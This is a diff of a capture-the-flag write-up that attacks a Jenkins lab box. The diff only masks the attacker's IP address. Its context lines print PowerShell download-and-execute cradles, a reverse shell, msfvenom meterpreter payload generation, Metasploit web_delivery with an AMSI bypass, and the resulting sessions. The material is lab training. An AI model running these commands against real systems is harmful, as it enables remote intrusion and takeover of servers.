@@ -99,7 +99,7 @@ $ rlwrap nc -nlvp 1234
 Now, go to the build options and inject the following payload:
 
 ```powershell
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.0.54:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.0.54 -Port 1234
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.**.**:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.**.** -Port 1234
 ```
 
 Click Save, build the project. You should see that the web server has delivered the `Invoke-PowerShellTcp.ps1` script:
@@ -196,7 +196,7 @@ $ msfvenom \
 	-p windows/meterpreter/reverse_tcp \
 	-a x86 \
 	--encoder x86/shikata_ga_nai \
-	LHOST=10.9.0.54 \
+	LHOST=10.9.**.** \
 	LPORT=1234 \
 	-f exe \
 	-o shell.exe
@@ -219,13 +219,13 @@ $ msfconsole -q
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) > set LHOST 10.9.0.54
-LHOST => 10.9.0.54
+msf5 exploit(multi/handler) > set LHOST 10.9.**.**
+LHOST => 10.9.**.**
 msf5 exploit(multi/handler) > set LPORT 1234
 LPORT => 1234
 msf5 exploit(multi/handler) > run
 
-[*] Started reverse TCP handler on 10.9.0.54:1234 
+[*] Started reverse TCP handler on 10.9.**.**:1234 
 ~~~
 
 Time now to download our payload on the server. Make sure the http server is still running (make sure it is running from the location where the `exe` file is):
@@ -240,7 +240,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Go to Jenkins and use the build settings interface to inject the following payload to download our `exe`. Then build the project once again.
 
 ~~~
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.54:8000/shell.exe','shell.exe')"
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.**.**:8000/shell.exe','shell.exe')"
 ~~~
 
 To check that the exe has been sucessfully downloaded:
@@ -258,7 +258,7 @@ Unfortunately, using this approach fails (tested on 2 different machines with 2 
 ~~~
 msf5 exploit(multi/handler) > run
 
-[*] Started reverse TCP handler on 10.9.0.54:1234 
+[*] Started reverse TCP handler on 10.9.**.**:1234 
 [*] Sending stage (176195 bytes) to 10.10.31.231
 ~~~
 
@@ -271,8 +271,8 @@ unknown@kali:/data$ msfconsole -q
 msf5 > use exploit/multi/script/web_delivery
 msf5 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
-msf5 exploit(multi/script/web_delivery) > set LHOST 10.9.0.54
-LHOST => 10.9.0.54
+msf5 exploit(multi/script/web_delivery) > set LHOST 10.9.**.**
+LHOST => 10.9.**.**
 msf5 exploit(multi/script/web_delivery) > set LPORT 1234
 LPORT => 1234
 msf5 exploit(multi/script/web_delivery) > set target PSH
@@ -295,7 +295,7 @@ Payload options (windows/meterpreter/reverse_tcp):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.9.0.54        yes       The listen address (an interface may be specified)
+   LHOST     10.9.**.**        yes       The listen address (an interface may be specified)
    LPORT     1234             yes       The listen port
 
 
@@ -309,7 +309,7 @@ Exploit target:
 msf5 exploit(multi/script/web_delivery) > run
 [*] Exploit running as background job 1.
 [*] Exploit completed, but no session was created.
-[*] Started reverse TCP handler on 10.9.0.54:1234 
+[*] Started reverse TCP handler on 10.9.**.**:1234 
 [*] Using URL: http://0.0.0.0:8080/gTBAQaTxuY
 [*] Local IP: http://172.16.222.130:8080/gTBAQaTxuY
 [*] Server started.
@@ -318,7 +318,7 @@ powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0
 [*] 10.10.31.231     web_delivery - Delivering AMSI Bypass (939 bytes)
 [*] 10.10.31.231     web_delivery - Delivering Payload (1892 bytes)
 [*] Sending stage (176195 bytes) to 10.10.31.231
-[*] Meterpreter session 1 opened (10.9.0.54:1234 -> 10.10.31.231:49202) at 2020-05-15 14:48:35 +0200
+[*] Meterpreter session 1 opened (10.9.**.**:1234 -> 10.10.31.231:49202) at 2020-05-15 14:48:35 +0200
 
 msf5 exploit(multi/script/web_delivery) > sessions
 
@@ -327,7 +327,7 @@ Active sessions
 
   Id  Name  Type                     Information            Connection
   --  ----  ----                     -----------            ----------
-  1         meterpreter x86/windows  alfred\bruce @ ALFRED  10.9.0.54:1234 -> 10.10.31.231:49202 (10.10.31.231)
+  1         meterpreter x86/windows  alfred\bruce @ ALFRED  10.9.**.**:1234 -> 10.10.31.231:49202 (10.10.31.231)
 
 msf5 exploit(multi/script/web_delivery) > 
 ~~~
@@ -379,7 +379,7 @@ There's more reading [here](https://www.exploit-db.com/papers/42556).
 ## #3.1 - View all the privileges using whoami /priv
 
 ~~~
-[*] Meterpreter session 1 opened (10.9.0.54:1234 -> 10.10.31.231:49206) at 2020-05-15 15:09:31 +0200
+[*] Meterpreter session 1 opened (10.9.**.**:1234 -> 10.10.31.231:49206) at 2020-05-15 15:09:31 +0200
 
 msf5 exploit(multi/script/web_delivery) > sessions
 
@@ -388,7 +388,7 @@ Active sessions
 
   Id  Name  Type                     Information            Connection
   --  ----  ----                     -----------            ----------
-  1         meterpreter x86/windows  alfred\bruce @ ALFRED  10.9.0.54:1234 -> 10.10.31.231:49206 (10.10.31.231)
+  1         meterpreter x86/windows  alfred\bruce @ ALFRED  10.9.**.**:1234 -> 10.10.31.231:49206 (10.10.31.231)
 
 msf5 exploit(multi/script/web_delivery) > sessions -i 1
 [*] Starting interaction with 1...
